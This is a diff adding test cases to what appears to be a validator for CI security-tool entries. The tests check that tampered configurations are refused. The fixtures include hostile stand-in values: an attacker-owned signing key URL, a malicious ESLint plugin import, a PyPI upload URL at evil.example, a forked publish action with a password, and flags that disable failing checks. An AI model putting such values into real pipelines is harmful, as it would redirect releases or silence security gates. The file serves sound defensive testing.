+    look.verifiedWith = { kind: 'cosign-key', keyUrl: 'https://raw.githubusercontent.com/evil/gosec2/v2.29.0/cosign.pub', keySha256: SUM, verifiedOn: rawFile().pinnedOn.slice(0, 10) };
+    refused(look, /no argv allowlist/); // and now refused for its id: no allowlist (P19)
+    // mypy's --install-types installs unpinned stub packages from PyPI
+    refused(both(realEntry('mypy'), plus('--install-types', '--non-interactive')), /allowlist, ruling P19/);
+    // a word the template may not name (a second program, a script)
+    refused(both(realEntry('coverage-py'), swap('pytest', 'evilmodule')), /may name only pytest/);
+    // the pinned ESLint config is executable JS: only the reviewed content (probe 20)
+    const imp = realEntry('eslint-typescript');
+    imp.fixedInputs.config.content = "import x from 'eslint-plugin-evil';\nexport default [x];\n";
+    refused(imp, /exactly the content reviewed/);
+    // short forms and abbreviations are refused (argparse would expand --exit to --exit-zero)
+    refused(both(realEntry('bandit'), plus('--exit')), /allowlist, ruling P19/);
+    refused(both(realEntry('ruff'), plus('-e')), /allowlist, ruling P19/);
+  });
+
+  it('P20 (I1, probes 5-13, 15, 16): flags, env and configs that turn failing off are refused, tool by tool', () => {
+    const NOPE = /allowlist, ruling P19|ruling P20|in effect|exactly the content reviewed|gets no env|placeholder/;
+    const cases: [string, (e: Entry) => Entry][] = [
+      ['gosec', (e) => both(e, plus('-no-fail'))],
+      ['gosec', (e) => { e.choices = { 'no-fail': ['true'] }; return e; }],
+      ['hadolint', (e) => both(e, plus('--no-fail'))],
+      ['hadolint', (e) => both(e, swap('warning', 'none'))],
+      ['hadolint', (e) => both(e, plus('-t', 'none'))],
+      ['hadolint', (e) => { e.step.cli.env = { HADOLINT_NOFAIL: '1' }; return e; }],
+      ['hadolint', (e) => { e.fixedInputs.config.content = 'failure-threshold: none\n'; return e; }],
+      ['bandit', (e) => both(e, plus('--exit-zero'))],
+      ['bandit', (e) => both(e, plus('-lll'))],
+      ['ruff', (e) => both(e, plus('--exit-zero'))],
+      ['ruff', (e) => both(e, plus('--fix', '--exit-zero'))],
+      ['ruff-format', (e) => both(e, without('--check'))],
+      ['prettier', (e) => both(e, swap('--check', '--write'))],
+      ['eslint', (e) => both(e, swap('0', '9999'))],
+      ['eslint', (e) => both(e, plus('--fix'))],
+      ['poutine', (e) => both(e, without('--fail-on-violation'))],
+      ['pinact', (e) => both(e, without('--check'))],
+      ['biome', (e) => both(e, plus('--linter-enabled=false', '--formatter-enabled=false'))],
+      ['biome', (e) => { e.step.cli.command = ['biome', 'check', '--write']; return e; }],
+      ['oxlint-typeaware', (e) => both(e, without('--deny-warnings'))],
+      ['oxlint-typeaware', (e) => { e.fixedInputs.config.content = '{ "categories": { "correctness": "off" } }\n'; return e; }],
+      ['kube-linter', (e) => { e.fixedInputs.config.content = 'checks:\n  doNotAutoAddDefaults: true\n'; return e; }],
+      ['c8', (e) => both(e, without('--check-coverage'))],
+      ['vitest-coverage', (e) => both(e, without('--coverage'))],
+      ['schemathesis', (e) => both(e, swap('25', '1'))],
+      ['schemathesis', (e) => { e.step.cli.command.push('--header', `${'Author' + 'ization'}: ${'x'}`); return e; }],
+      ['knip', (e) => { e.step.cli.command.push('--no-exit-code'); return e; }],
+      ['vulture', (e) => both(e, swap('80', '100'))],
+    ];
+    for (const [id, change] of cases) refused(change(realEntry(id)), NOPE);
+    // each changed entry is refused, the unchanged one loads
+    for (const id of new Set(cases.map(([id]) => id))) expect(loadAt([realEntry(id)]), id).toHaveLength(1);
+  });
+
+  it('P20 (I2, probe 14): trivy --exit-code is exactly 1 in the command and the fixed args, never a choice; every severity includes CRITICAL', () => {
+    const EXIT = /--exit-code 1, exactly/;
+    refused(both(realEntry('trivy-licence'), swap('1', '0')), EXIT);
+    refused(both(realEntry('trivy-licence'), (xs) => xs.filter((x, i) => x !== '--exit-code' && xs[i - 1] !== '--exit-code')), EXIT);
+    refused(both(realEntry('trivy-image'), swap('1', '256')), EXIT);
+    const fixedOnly = realEntry('trivy-config');
+    fixedOnly.fixedInputs.args = without('--exit-code', '1')(fixedOnly.fixedInputs.args);
+    refused(fixedOnly, EXIT);
+    const choice = realEntry('trivy-image');
+    choice.choices['exit-code'] = ['0', '1'];
+    refused(choice, /exit-code/);
+    refused(both(realEntry('trivy-licence'), swap('HIGH,CRITICAL', 'UNKNOWN')), /includes CRITICAL/);
+    for (const v of [['UNKNOWN'], ['HIGH'], ['LOW,MEDIUM'], ['CRITICAL', 'HIGH']]) {
+      const sev = realEntry('trivy-config');
+      sev.choices.severity = v;
+      refused(sev, /includes CRITICAL/);
+    }
+    const ok = realEntry('trivy-config');
+    ok.choices.severity = ['CRITICAL', 'HIGH,CRITICAL'];
+    expect(loadAt([ok])).toHaveLength(1);
+  });
+
+  it('P21 (I3, probe 17): gitleaks, the fallback, has the betterleaks locks', () => {
+    const NOPE = /allowlist, ruling P19|ruling P20|in effect|exactly the content reviewed|gets no env|output file/;
+    refused(both(realEntry('gitleaks'), plus('-v')), NOPE);
+    refused(both(realEntry('gitleaks'), plus('--verbose')), NOPE);
+    refused(both(realEntry('gitleaks'), swap('gitleaks.sarif', '-')), NOPE);
+    refused(both(realEntry('gitleaks'), swap('1', '0')), NOPE);
+    refused(both(realEntry('gitleaks'), swap('--redact', '--redact=0')), NOPE);
+    refused(both(realEntry('gitleaks'), without('--redact')), NOPE);
+    refused(both(realEntry('gitleaks'), without('--ignore-gitleaks-allow')), NOPE);
+    const noConfig = realEntry('gitleaks');
+    delete noConfig.fixedInputs.config;
+    refused(noConfig, NOPE);
+    const env = realEntry('gitleaks');
+    env.step.cli.env = { GITLEAKS_CONFIG: 'x.toml' };
+    refused(env, NOPE);
+    expect(loadAt([realEntry('gitleaks')])).toHaveLength(1);
+  });
+
+  it('P22 (I4, probes 21-23): pypi-publish publishes to PyPI or TestPyPI only, by its name under any owner; one spelling per input', () => {
+    const pub = () => realEntry('pypi-publish');
+    const setWith = (e: Entry, k: string, v: string) => { e.step.action.with[k] = v; e.fixedInputs.with[k] = v; return e; };
+    refused(setWith(pub(), 'repository-url', 'https://evil.example/legacy/'), /repository-url/);
+    const choice = pub();
+    choice.choices = { 'repository-url': ['https://upload.pypi.org/legacy/'] };
+    refused(choice, /repository-url/);
+    const stepOnly = pub();
+    stepOnly.step.action.with['repository-url'] = 'https://test.pypi.org/legacy/';
+    refused(stepOnly, /repository-url/); // set, but not fixed
+    expect(loadAt([setWith(pub(), 'repository-url', 'https://test.pypi.org/legacy/')])).toHaveLength(1);
+    expect(loadAt([setWith(pub(), 'packages-dir', 'dist')])).toHaveLength(1);
+    refused(setWith(pub(), 'verify-metadata', 'false'), /may set only/);
+    // a fork under another owner, with a password (probe 22)
+    const PW = ['pass', 'word'].join('');
+    const fork = pub();
+    fork.candidate.repo = 'evilorg/gh-action-pypi-publish';
+    fork.candidate.name = 'evilorg/gh-action-pypi-publish';
+    fork.step.action.uses = fork.step.action.uses.replace('pypa/', 'evilorg/');
+    refused(setWith(fork, PW, 'x'), /password/);
+    // two spellings of one input (probe 23), for every action
+    refused(setWith(pub(), 'Attestations', 'false'), /twice in different letter case/);
+    const sc = realEntry('scorecard-action');
+    refused(setWith(sc, 'PUBLISH_RESULTS', 'true'), /twice in different letter case/);
+    const dr = realEntry('dependency-review-action');
+    refused(setWith(dr, 'COMMENT-SUMMARY-IN-PR', 'always'), /twice in different letter case/);
+    // dependency review: warn-only only ever fixed "false"; no config file (P20)
+    refused(setWith(realEntry('dependency-review-action'), 'warn-only', 'true'), /warn-only/);
+    const warnChoice = realEntry('dependency-review-action');
+    warnChoice.choices = { 'warn-only': ['true', 'false'] };
+    refused(warnChoice, /warn-only/);
+    expect(loadAt([setWith(realEntry('dependency-review-action'), 'warn-only', 'false')])).toHaveLength(1);
+    refused(setWith(realEntry('dependency-review-action'), 'config-file', 'someorg/somerepo/dr.yml@main'), /config-file/);
+  });
+
+  it('P23 (I5): configSections name a file and a section; the auto-loaded config sources are listed', () => {
+    for (const bad of ['pyproject.toml', ':tool.mypy', '../x.toml:a', '/etc/x:y', 'pyproject.toml:', 'a b:c']) {
+      const e = realEntry('mypy');
+      e.configSections = [bad];
+      refused(e, /config section|configSections/);
+    }
+    const t = (id: string) => byId(real(), id)[0];
+    expect(t('mypy')?.configSections).toEqual(expect.arrayContaining(['pyproject.toml:tool.mypy', 'setup.cfg:mypy']));
+    expect(t('coverage-py')?.configSections).toEqual(expect.arrayContaining(['pyproject.toml:tool.coverage', 'setup.cfg:coverage:*', 'tox.ini:coverage:*']));
+    expect(t('c8')?.configSections).toEqual(['package.json:c8']);
+    expect(t('prettier')?.configSections).toEqual(['package.json:prettier']);
+    expect(t('ruff')?.configSections).toEqual(['pyproject.toml:tool.ruff']);
+    expect(t('bandit')?.configSections).toEqual(['pyproject.toml:tool.bandit']);
+    expect(t('oxlint-typeaware')?.configFiles).toEqual(expect.arrayContaining(['.eslintignore', '**/.oxlintrc.json']));
+    expect(t('prettier')?.configFiles).toEqual(expect.arrayContaining(['**/.prettierrc', '**/.prettierrc.*', '.editorconfig']));
+    expect(t('biome')?.configFiles).toEqual(expect.arrayContaining(['**/biome.json', '**/biome.jsonc']));
+    expect(t('c8')?.configFiles).toEqual(expect.arrayContaining(['.c8rc.*', '.nycrc.*']));
+  });
+
+  it('P24 (I6, spec): coverage-py runs `coverage report --fail-under={fail-under}` after the tests; vitest a lines minimum; never 0', () => {
+    const cov = byId(real(), 'coverage-py')[0];
+    expect(cov?.step.cli?.then).toEqual([['coverage', 'report', '--fail-under={fail-under}']]);
+    expect(cov?.choices['fail-under']).toEqual(['60', '70', '80', '90']);
+    const noThen = realEntry('coverage-py');
+    delete noThen.step.cli.then;
+    refused(noThen, /follow-up command/);
+    const zero = realEntry('coverage-py');
+    zero.choices['fail-under'] = ['0', '60'];
+    refused(zero, /fail-under/);
+    const literal = realEntry('coverage-py');
+    literal.step.cli.then = [['coverage', 'report', '--fail-under=0']];
+    refused(literal, /fail-under/);
+    const missing = realEntry('coverage-py');
+    missing.step.cli.then = [['coverage', 'report']];
+    refused(missing, /--fail-under/);
+    const other = realEntry('coverage-py');
+    other.step.cli.then = [['sh', '-c', 'true']];
+    refused(other, /runs coverage itself/);
+    const unknownChoice = realEntry('coverage-py');
+    unknownChoice.step.cli.then = [['coverage', 'report', '--fail-under={nope}']];
+    refused(unknownChoice, /fail-under|choice/);
+    const vit = byId(real(), 'vitest-coverage')[0];
+    expect(vit?.step.cli?.command).toContain('--coverage.thresholds.lines={coverage-lines}');
+    const vzero = realEntry('vitest-coverage');
+    vzero.choices['coverage-lines'] = ['0'];
+    refused(vzero, /coverage\.thresholds\.lines/);
+    refused(both(realEntry('vitest-coverage'), without('--coverage.thresholds.lines={coverage-lines}')), /in effect/);
+    // a choice no placeholder uses is refused (the AI sets only what the template names)
+    const unused = realEntry('c8');
+    unused.choices = { lines: ['60'] };
+    refused(unused, /only a \{lines\} placeholder/);
+  });
+
+  it('P25 (I7): kube-linter fails on no objects and invalid resources; the ESLint configs lint the framework files', () => {
+    for (const f of ['--fail-if-no-objects-found', '--fail-on-invalid-resource']) refused(both(realEntry('kube-linter'), without(f)), /in effect/);
+    for (const id of ['eslint', 'eslint-typescript']) {
+      const content = byId(real(), id)[0]?.fixedInputs.config?.content ?? '';
+      for (const ext of ['jsx', 'vue', 'svelte', 'astro']) expect(content, `${id} ${ext}`).toContain(ext);
+    }
+    expect(byId(real(), 'eslint-typescript')[0]?.fixedInputs.config?.content).toContain('tsx');
+  });
+
+  it('P26 (I8): an action that runs an image records it with its digest; no digest, a malformed one or a cli entry is refused', () => {
+    const sc = byId(real(), 'scorecard-action')[0];
+    expect(sc?.wrappedImage).toEqual({ ref: 'ghcr.io/ossf/scorecard-action:v2.5.0', digest: 'sha256:1e1481c65fc2407d3fd6ab18a23c741eb4d1c0d9359ebafc4b3ab13aa61d8627' });
+    const noDigest = realEntry('scorecard-action');
+    delete noDigest.wrappedImage.digest;
+    refused(noDigest, /digest/);
+    const badDigest = realEntry('scorecard-action');
+    badDigest.wrappedImage.digest = 'v2.5.0';
+    refused(badDigest, /digest/);
+    const onCli = realEntry('gosec');
+    onCli.wrappedImage = { ref: 'x/y:1', digest: DIGEST };
+    refused(onCli, /wrappedImage is for actions/);
+    const never = realEntry('scorecard-action');
+    never.wrappedImage.ref = 'aquasec/trivy:0.69.5';
+    refused(never, /never adds/);
+  });
+
+  it('P27 and minors: gosec tracks suppressions; betterleaks exit code in both (M1) and format bound to the output (M2); release dates (M5)', () => {
+    refused(both(realEntry('gosec'), without('-track-suppressions')), /track-suppressions/);
+    expect(byId(real(), 'gosec')[0]?.step.cli?.command).toContain('-track-suppressions');
+    refused(both(realEntry('betterleaks'), (xs) => xs.filter((x, i) => x !== '--exit-code' && xs[i - 1] !== '--exit-code')), /--exit-code/);
+    refused(both(realEntry('betterleaks'), swap('sarif', 'csv')), /report-format csv/);
+    const raw = (id: string) => rawFile().tools.find((t) => t.id === id) as Entry;
+    expect(raw('nuclei').releasedAt).toBe('2026-08-08T12:51:42Z');
+    expect(raw('jscpd').releasedAt).toBe('2026-10-20T16:15:27Z');
   });
 });
 
